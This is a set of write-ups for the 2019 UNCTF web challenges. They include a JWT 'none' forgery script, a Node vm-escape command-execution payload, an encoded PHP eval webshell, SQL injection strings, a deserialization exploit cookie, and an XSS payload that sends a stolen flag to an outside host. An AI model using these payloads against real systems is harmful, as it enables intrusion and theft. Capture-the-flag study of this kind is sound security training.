# 2019UNCTF
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 暂无

# 网上公开WP：
+ 暂无

# 本站备份WP：
**感谢作者：2019unctf提供**
## WEB
### Arbi
#### 第一步
首先题目拿到是黑盒环境，注册账号后登陆，发现img标签src属性有个接口存在ssrf
题目提示了python3 http.server
所以可以猜测服务器9000端口开了个http.server可以读取文件
上传头像后 会通过ssrf去请求upload目录里的图像 ，直接通过web访问upload目录也可以访问图像，可以断定
http.server的根目录就是web目录，所以可以读取源码
但是ssrf判断了用户名和url必须匹配，所以通过注册恶意用户名，来绕过接口判断，来读取任意文件
PS： 我这里修改了http.server的源码不能列目录，所以注册/等列目录的文件名是不行的

由于X-Powered-By 看出后端采用express开发，web应用下应存在package.json文件
注册 ../package.json? 用户，通过接口读取到了package.json文件
得到提示1，flag在根目录/flag下

#### 第二步
package.json 显示主入口为mainapp.js，所以继续注册读取mainapp.js文件，
发现路由在 /routers/index.js文件
继续读取
为了让师傅们不这么恶心的做题，我直接在放了个源代码的zip在一个路由上，
读取 /routers/index.js 可以看到有个 VerYs3cretWwWb4ck4p33441122.zip 路由
直接在web上访问即可下载源代码，从而避免重复无用的做题步骤。源代码文件和题目环境文件完全一致
除了部署后动态生成的sessions文件外。
#### 第三步
然后就是白盒审计，可以发现注册登录功能采用了jwt认证，这里我参考了[ångstromCTF 2019](https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#%C3%A5ngstromctf-2019----quick-write-ups-by-terjanq-web)的 Cookie Cutter题目
认证过程是，每个人拥有自己独立的jwt secret
并且存在于服务端一个列表中，并且不同用户secret列表对应的id存储在了jwt中，登陆的时候会直接从jwt token中读取id
然后通过列表获取secret 进行解密，这里有个trick，node的jsonwebtoken 有个bug，当jwt secret为空时
jsonwebtoken会采用algorithm none进行解密
又因为服务端 通过
```javascript
 var secret = global.secretlist[id];
 jwt.verify(req.cookies.token,secret);
```

解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin
```python
# pip3 install pyjwt
import jwt
token = jwt.encode({"id":-1,"username":"admin","password":"123456"},algorithm="none",key="").decode(encoding='utf-8')
print(token)
```
#### 第四步
成为admin后，就可以访问admin23333_interface接口
审计可以发现，这是一个读取文件的接口
这里用到了express的特性，当传入?a[b]=1的时候,变量a会自动变成一个对象
a = {"b":1}
所以可以通过传入name为一个对象，避开进入if判断 从而绕过第一层`if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);`的白名单过滤
第二个过滤是 判断filename 不能大于3,否者会过滤.和/,而读取flag需要先目录穿越到根目录
而../就已经占了3个字符，再加上flag肯定超过限制
这时候可以换个思路，length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环
即可完美绕过过滤
而express 中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&a=456
解析后
a = [123,456]，所以最终组合成

`/admin23333_interface?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g`

### bypass
1）	打开浏览器，访问目标主机，发现源代码 

![](https://ctfwp.wetolink.com/2019unctf/bypass/0.png)

2）	可以发现可以命令执行但是waf禁用了大部分符号，只能执行 file 命令，考虑如何bypass，发现误写反斜杠匹配模式，`\\|\n`会被解释为匹配竖线与换行符的组合,所以可以直接用%0a进行命令注入，最后在bypass的时候由于过滤了bin，以及grep，可以用/???/gr[d-f]p 的形式绕过，最后用`+` 绕过空格过滤

3）	最后payload见下图
 
![](https://ctfwp.wetolink.com/2019unctf/bypass/1.png)

### CheckIn
#### 原理知识
1）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。
2）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。  
3）	远程执行代码漏洞会使得攻击者在用户运行应用程序时执行恶意程序，并控制这个受影响的系统。攻击者一旦访问该系统后，它会试图提升其权限。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
图1 web界面
2）分析js代码可以得知还有calc的功能，如下图2所示：
 
![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin1.png)

3）从calc的源码可以看到，问题出在下面的eval函数上，导致了RCE远程代码执行漏洞：

![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin2.png)

4）想要执行命令需要先绕过nodejs的vm模块，使用this.constructor.constructor（Object 类的 constructor 是外层的 Function 类）来完成逃逸，从而利用rce漏洞来读取flag文件，payload关键如下所示

'(new this.constructor.constructor("return this.process.mainModule.require;"))()("child_process").execSync("cat /flag").toString();';

5）执行exp.js结果如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin3.png)

### CheckInA
#### 原理知识
原理知识	1）	Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina1.png)

2）由界面可知这是一个聊天室，想要发言需要起一个nickname：
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina2.png)

3）盲测或者分析js代码，我们可以得知，输入/help后可以查看指令，发现需要输入/more查看更多指令,发现有/flag指令
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina4.png)

4）输入/flag，得到flag
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina4.png)

### Do you like xml
#### 原理知识
1）	XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。
#### 解题过程
1）打开浏览器，访问目标主机，发现提示flag in this pic图片提示。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do1.png)

2）根据图片名hex.png以16进制或txt格式打开hex.png图片发现flag位置。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do2.png)

3）	根据weak password提示，使用admin登录用户名密码，显示登陆成功，但无其他响应。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do3.png)

4）	使用burp抓包发现xxe漏洞，利用xxe漏洞和php://filter伪协议读取flag.php文件，得到base64加密的字符串。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do4.png)

5）	base64解密，得到flag。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do5.png)

### easy_file_manage
#### 原理知识
+ 1.	第一个点是逻辑出现错误，先修改再判断了。
+ 2.	第二个点是有些CMS 会出现的问题，这个是比较简单的，比较难的可以参考：
https://wizardforcel.gitbooks.io/php-common-vulnerability/content/58.html?tdsourcetag=s_pcqq_aiomsg
#### 解题过程
 首先打开网页 

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea1.png)

正常注册登录后：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea2.png)

有提示看看 robots 文件，看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea3.png)

提示了两个备份文件，下载下来看看：

首先看看 download.php：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea4.png)

功能看起来像是查询数据库，拿到filename 后下载出来。其中还判断了user_id 。

再看看rename.php

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea5.png)

这里首先是更改了数据库，再检查后缀，所以我们可以通过这个读取任意文件，但是有判断不能读取
config 和 flag。

再看看 flag.php\~

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea6.png)

这里是要登陆 user_id 是 99999... 的，显然不可能，我们可以看看check_login
这个函数。尝试读取 function.php。

首先上传一个正常的图片：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea7.png)

改名，这里先记住 f_id：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea8.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea9.png)

会提示出错，但此时数据的filename字段已经被修改了，我们下载的时候是从数据库中查询出来的，然后访问
download.php 带入进 f_id：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea10.png)

下载下来后查看check_login 函数:

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea11.png)

这里调用了 decrypt_str 解 \$_COOKIE[user] ，看看这个函数：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea12.png)

这两个函数，一个加密一个解密，大致就是将密钥和字符串进行一些简单的运算。

这是可以破解的，我们只要知道明文和密文，就能解出密钥了，我们再看看 login.php;

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea13.png)

Id的话，在首页有显示出来：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea14.png)

从 COOKIE 中把密文拿出来，尝试破解一下密钥：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea15.png)

这里要先urldecode 一次，因为 进入 \_COOKIE 时 php 好像自动把
%编码了一次，这里的解密函数直接用function.php 的即可：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea16.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea17.png)

我们把明文当作密钥，这里要先 serialize 一下，因为加密时对明文 serialize 了。

这样就可以解密出KEY了，因为加密时是循环取 KEY 的值，所以开始重复时就是 KEY了。

这里的 SECRET_KEY 应该时 THIS_KEY。根据 flag.php\~的提示 ，我们加密一个 id 是
99999999999999999 的，还有第二条件是存在 flag_pls ：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea18.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea19.png)

还要再 urlencode 一次，放进 \$_COOKIE 里就行了。

先不替换访问flag.php 试试：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea20.png)

替换 \$_COOKIE 后：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea21.png)
### easy_pentest
#### 原理知识
1.存在waf拦截以下几种：

php标记:
`<?php , <?= , <?`

php函数:
              `base64_decode，readfile，convert_uuencode，file_get_contents`
              
关键字:
               `php://`
               
2.disable_function禁用了以下函数：

 `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,passthru,exec,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,system,mail,error_log,move,copy,unlink`

3.需要一个safe_key 来让waf允许参数传入，否则所有参数都拒绝接收。

#### 解题过程
##### 1.获取safe_key
获取safe_key来允许参数传入通过访问发现跳转到一个页面，显示403表明缺少safe_key来通过安全验证，页面如下图
![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005012080_9507.png)

Tp存在日志规律，请求都会记录在日志中，通过编写EXP来遍历所有可能存在的日志
EXP代码如下：
![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005113182_4062.png)

执行exp脚本，发现存在02.log日志

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005150409_29799.png)

打开日志可以看到记录了一条请求，通过GET方式请求且携带参数名为safe_key 值为 easy_pentesnt_is_s0fun 如下图

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005341443_30605.png)

携带safe_key 再去访问public/index.php  发现跳转到了安全页面可知过了waf的安全验证。如图

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005539187_16140.png)

##### 2.绕过限制来利用TP5 RCE漏洞
常见的tp5rce利用为 写日志，包含日志。写session，包含session。而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截。

所以我们这里通过变形来绕过，利用base64编码与php://filter伪协议，通过inlcude方法进行包含，可以利用`php://filter/read=convert.base64-decode/resource=/var/www/html/runtime/temp/用户session名 `的方式进行解码。

然而session里面还有其他字符串，为了让传入的webshell能够被正确解码，我们需要构造合适的字符串。例如：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```

前后两个ab是为了满足shellcode前后两段字符串来被解析，可以fuzz判断需要加几个来凑满四个字节保证shellcode正常解析。

但是waf拦截了php等关键字，所以还需要绕过。filter其实是可以传递多个的，同时参数为参数引用。可通过strrev反转函数来突破限制。


##### 3.利用

第一步通过设置session，将webshell写入到session中在包含利用，payload为：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```


如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007010634495_3110.png)

第二步通过webshell列出home目录，payload为：

```
var_dump(scandir("/home"));
dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7
```

获取到home目录底下的flag文件名字，如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007011410830_14019.png)

第三步读取flag，payload为：

```
echo(readfile("/home/flag_1sh3r3.txt"));
ZWNobyhyZWFkZmlsZSgiL2hvbWUvZmxhZ18xc2gzcjMudHh0IikpOw==
```

如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007011921707_19231.png)

##### 4.通过exp获取flag

执行get_flag.py , 传入网站地址和端口。 例如`python get_flag.py 192.168.232.144:88` 运行后获取到flag

如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007025804693_13219.png)

**参考**

+ Phithon：https://www.leavesongs.com/PENETRATION/php-filter-magic.html

+ 水泡泡：https://xz.aliyun.com/t/6106

### easy_sql_injection
#### 原理知识
改自ThinkPHP 的历史漏洞
#### 解题过程
首先打开首页：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/34f3d8ed3aeab22f446f4cffa66daf1d.png)

发现有源码，下载。

首先是 index：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/15fccc0452411bb82be7ceec76b14e81.png)

发现调用了 Db类的一些操作，看看 Db：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/54f9a036a519de9ead5f3825371ceff5.png)

首先时buildSql 函数，这应该是构建语句的函数，进去看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/e5f50841ab15d2a8f0079d408e69ea59.png)

ParseWhere，继续跟入：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/0f5a90e98fc789f14c36b627e56a87c2.png)

这里关键是parseWhereItem 函数，进去看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/d74ca8e4f51af4860eed249460e61d4a.png)

简单的分析一下：这里的 \$val
是我们可控的值，可以是一个数组。如果是数组，is_scalar 就会返回 false，就不如进入
bind了。这个bind是 pdo的预处理，然后下面会根据 \$exp 的值执行了一些操作，这里
\$exp 也是我们可控的值，所以我们可以跟几个函数看看有没有注入的地方：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/a96fa5e5d4690b78f33442af5819d230.png)

分析后我们会看见，大部分函数都在函数内有绑定参数，但是有一个函数：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/f60cf7634e1b61065f89538925a83d14.png)

这里直接将 \$field2 拼接进了字符串中，可能会导致注入。

我们试试看，回到 index.php中：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/9be47363005416d066b79d45a38c5bf6.png)

传入 keyword：keyword[]=column&keyword[1][]==&keyword[1][]=abcd%27

在本地实验一下，可以输出一下sql语句：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/5e8ad0ae885776ba40a92d2eb2acbb3e.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/ea4c3dce6374c67651b1c38ec2770482.png)

可以看到这里被 \` 包裹住了，我们可以逃逸出来，我们传入：

keyword[]=column&keyword[1][]==&keyword[1][]=abcd\`) union select 1,2%23

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/42411d349e4a595592e675a94b894ad1.png)

这里 abcd 因为被
反引号包裹会被作为一个字段，所以要用一个已经存在的字段，否则会报错，我们可以猜一个字段名，比如id。

改一下语句，改成：id\`) union select 1,sleep(3)%23

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/30518999ae15aa1b577cf77963d6f8ca.png)

延时成功，证明可以使用盲注，我们可以上 sqlmap了：

执行语句：python sqlmap.py -u
"http://127.0.0.1/?keyword[]=column&keyword[1][]==&keyword[1][]=id\`) union
select 1,2\*%23"

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/8e6e95c9b025898fe834d9923f2375a2.png)

然后加上 --current-db 得出当前数据库为 haha。

加上 -D haha --tables 跑出表名，发现存在 flag 表。

最后加上参数：-D haha -T flag --dump 跑出flag：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/9e406dda1d224a57d5807d9fd7bc08b1.png)


### easyphp
#### 预备知识
1）	通过管道执行命令绕过waf
#### 解题过程

1）打开浏览器，访问目标主机，审计源码

2）提交如下payload system(“ ls;cat”);

![](https://ctfwp.wetolink.com/2019unctf/easy_php/72dc63fac1601992e000c847fc5c644b.png)

1.  发现flag文件，继续提交如下payload system(“\<flag cat”);

2.  使用脚本循环上传，并访问使用脚本不间断获取返回文件
    名并使用脚本访问该文件以便获得稳定的页面

![](https://ctfwp.wetolink.com/2019unctf/easy_php/5f32b440e96727212ea59ca3cb99ca21.png)

### EasyXSS
#### 预备知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以在页面上插入 XSS 语句。
2）	后端程序未关闭调试模式，可以将前端发送的数据回显出来。

#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/3cc3d131f809c4db4c8be6925145cc32.png)

1.  随意测下，页面有 xss。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/47872259fe6f74fdc3784b25c575f960.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/1a6a4e7f373fd49d7ac9a800645b73fe.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/bab186519709f76afc85cbd1e82b280d.png)

1.  题目题面里有说 flag 在 httponly 的 cookie
    里，那么就来查找一下有什么页面可以利用的。

>   F12 看一下每个页面发的 ajax 请求。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/32bdd309fa0e45bfcb015c1a4f9177e1.png)

>   这个页面似乎可以利用，不带 id 参数打开，调试信息里有 Cookie 信息。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/1a3660e864cd3d69bc4b35d2e685979b.png)

>   再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。

1.  然后就来构造一个 XHR 请求的 Payload 来利用这个页面拿 flag 吧。

```
<img src='/efefefe' onerror="xmlhttp=new
XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='http://xss.zhaoj.in/?flag='
xmlhttp.responseText.match('flag\\{(.\*?)\\}')[1]}};xmlhttp.open('GET','/index.php/treehole/view?id=',true);xmlhttp.send('');"/\>
```

1.  打过去，flag 到手。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/f00cc716dc47bc33963ef133e668d2ee.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/d09d2571141a0c0f6ce0eb8debd68bf9.png)


### GoodJava
#### 前言
由于之前没怎么写过Java，此题可能有些bug，但对于拿flag影响不大，还请师傅们见谅

此题参考了最近的TMCTF，经过了改编 加大了难度

原题是用原生Servlet编写
此题改写成了Springboot，并且在第一步加了过滤，第二步考点直接换成了Java命令执行绕过（改动很大）

#### 解题过程

##### 前序步骤

题目会提供一个Jar包

用idea打开反编译后审计源码

找到Controller

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/f632b2d3b620a2789cd736b3a3a83bc5.png)

###### 第一步

源码可知一共有两个路由

第二个路由需要输入secret密钥才能访问，而secret存在在服务器/passwd文件中

可以猜测第一个路由就是获取密钥文件的功能，跟进可以发现OIS类继承了ObjectInputStream，把POST数据传入OIS构造方法，而然后ois.readObject()则是反序列化操作

但是resolveClass方法限制了被反序列化的类只能是com.unctf.pojo.Man类

查看Man类，可以发现重写了readObject方法，这是Java反序列化的魔术方法，审计一下很容易发现XXE，根据代码构造即可

需要注意一下本地构造时serialVersionUID必须一致，此值代表了对象的版本或者说id，值不一致反序列化操作会失败

这里有个小考点，这里限制了xml数据不能含有file（大小写），而我们需要读取/passwd

这里有个trick，Java里面有个伪协议netdoc，作用和file一致，都是读取文件，所以这一步很简单，把file换成netdoc即可

注意一下本地构造包名也必须一致哦，不仅仅是类名一致就行

Man类加一个writeObject即可

详细步骤可以看看https://github.com/p4-team/ctf/tree/master/2019-09-07-trendmicro-quals/exploit_300

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/36bbca702b3e8ade40ea645de909d011.png)

exp

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/4dae53f0d9bdeb07a991c9c2e70d78c2.png)

output

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/003d4fd61709ab1fd5ea1d270ed823ce.png)

###### 第二步

然后就是第二步，考点是代码执行绕过

这里有个SPEL注入，可以构造任意类，但是同样代码过滤了Runtime\|ProcessBuilder\|Process

这三个Java中执行命令的类，题目提示必须执行命令才能拿到flag，然后Java又是强类型语言，很多操作不像php那么动态，所以这一步可能会难住很多人

然后这里有个trick，java内部有个javascript的解析器，可以解析javascript，而且在javascript内还能使用java对象

我们就可以通过javascript的eval函数操作

T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("xxxxxxxxx")

由于不能使用关键字，我们可以通过字符串拼接来

juke.outofmemory.cn/entry/358362

exp里面也有对应的转换脚本

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/0f2c349f76ddb214627f26e8b387f5dd.png)

exp

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/d70f4dd73c1f6dc5e2cb3974ab6e8f9d.png)

output

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/55f46b48d5d3e37080e089798b5b722f.png)


### happyphp

```
<?php

class Server{
    public $file;
}

$a = new Server;
$a->file = "php://filter/read=convert.base64-encode/resource=files_upload_api.php";
echo urlencode(serialize($a));

echo "<br>";

$a = new Server;
$a->file = "LXJuploadspaht/shell.jpg"; //你上传的shell
echo urlencode(serialize($a));
```

### K&K战队的老家
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。
3）	PHP是弱类型语言
4）	PHP魔术方法可以通过反序列化进行触发

#### 解题过程
1.  打开浏览器，访问目标主机，发现登录框

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/cb9602cd3c83cd58635bff01fff42823.png)

1.  构造万能密码 ‘||1||’登录

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/f781cac39386f55caf82e4667e1c9e4c.png)

1.  发现/home.php?m=debug无法访问

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/0bb67653980950e30858fc09cb65a80c.png)

1.  通过m参数利用php伪协议绕过过滤读取题目源代码

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/3774d088ce498995f46d4f841dd9455f.png)

1.  通过代码审计可知access.php和flag.php，同时发现备份文件access.php.bak

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/b4b60f19b3b4838665dec5d8eb9e10c0.png)

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/13f3c91cfa843cf87aa6361d5dbf9755.png)

1.  通过代码审计构造反序列化漏洞利用

exp.php
```
<?php
class debug {
	public $choose = "2aaaa";
	public $id = 2;
	public $username = "debuger";
	public $forbidden = NULL;
	public $access_token = "";
	public $ob = NULL;
	public $funny = NULL;
}
class session {
	public $access_token = '3ecReK&key';
}
function cookie_decode($str) {
	$data = urldecode($str);
	$data = substr($data, 1);
	$arr = explode('&', $data);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num - 240;
		$cipher = $cipher.'%'.dechex($num);
	}
	$key = urldecode($cipher);
	$key = base64_decode($key);
	return $key;
}
function cookie_encode($str) {
	$key = base64_encode($str);
	$key = bin2hex($key);
	$arr = str_split($key, 2);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num + 240;
		$cipher = $cipher.'&'.dechex($num);
	}
	return $cipher;
}
$obj = new debug();
$obj1 = new session();
$str1 = serialize($obj1);
$obj->forbidden = $obj;
$obj->ob = $obj;
$obj->funny = $str1;
$str = serialize($obj);
echo cookie_encode($str);
?>
```

运行exp.php构造cookie

```
&144&16a&15f&121&13f&159&13a&15b&14a&147&13a&121&14a&169&139&126&13e&16a&160&127&153&16a&15f&122&13f&159&13a&15a&151&137&129&166&153&122&145&159&13f&123&13d&126&13e&144&15f&159&13d&15d&136&158&149&147&135&159&13f&123&13d&126&13d&15a&15f&159&151&147&141&159&13f&122&15b&126&13d&15a&164&16a&13f&15a&157&126&139&15e&146&16a&14a&148&13a&165&149&147&121&15c&139&15a&164&16a&13f&15a&153&126&139&15d&142&15c&149&15e&146&15e&14a&148&139&159&13f&123&13d&126&13f&144&15f&159&14a&15d&129&169&149&15d&15c&15b&14a&137&146&165&139&15a&164&169&13f&15a&135&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&153&15a&15f&168&13f&123&13d&126&13e&144&15f&159&14a&15e&146&165&152&15e&15b&159&13f&123&13d&126&13e&144&149&126&139&15b&128&126&13e&16a&15f&159&153&122&146&16a&153&122&15c&166&152&159&139&126&13d&144&160&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&135&167&13f&159&139&16a&14a&147&13e&143&14a&145&163&15d&151&122&146&125&139&15a&164&129&139&15a&164&129
```

1.  得到flag

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/67d4b6019a7bd302e4bff4873717c10c.png)


### NSB_Login
#### 原理知识
1）	管理员使用了弱密码，就是那么简单。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/460324bc6174f208f5e6ddfde11ee10d.png)

1.  随便输入下，提示用户不存在。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/717836e4d81bf5d007dd0d571e3cf966.png)

1.  输入用户名 admin，提示密码错误。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/7aa3c8909ff7dfa3a06fafbfc34f0199.png)

1.  查看页面源代码，发现有提示 rockyou，应该是使用了 rockyou.txt
    这个非常有名的字典。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/96056000b29cdbbf24e6c3eec76565d4.png)

1.  编写 Python 脚本，读入 rockyou 字典，运行。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/227ea3f8cc3fc7cb6d8226b592aeba75.png)

1.  得到 flag。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/d03fa1140c58a15a97ed0f0a9646bf5b.png)


### NSB_Reset_Password
#### 原理知识
1）	找回密码时先提交并储存了用户名，然后验证了验证码之后储存了一个验证已通过的标志，最后提交新密码时再判断是否通过验证再重置指定用户密码。
2）	在验证通过，还没有提交新密码时如果再回到一开始提交用户名时即可覆盖储存用户名，再提交密码时导致可以重置任意用户密码。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f216bfb338cc476f8c4f372a437e2d7f.png)

1.  有注册，那就先来注册个用户看看。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/03830682fbdd891cc0c071aebc381897.png)

1.  然后登录，提示要干管理员。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/2ddb5ba58ab7bbf9262457d95023a5be.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/1ae2081d7d1be506d9959324c1d44fb3.png)

1.  那么就来找回密码试试。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/0fcbe940ff0737efb52c705087d03fc0.png)

1.  到邮箱可以看到验证码，填上。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/9e618fb43cad966f004872b3425b205c.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/c4f6631e5bf9e483fa5e701bece84303.png)

1.  然后再打开一个新的找回密码页面，输入用户名 admin，点击找回密码，让 admin
    来覆盖 session 中要重置密码的用户名。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f6385ecd7c88017b4baa6da954b168ae.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/ec94155052d4ab93232ae1f468c82bba.png)

1.  再回到刚才那个重置密码的页面，重置密码为 123456。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/eb1184534bbd1f3e8ef175f7705bf88b.png)

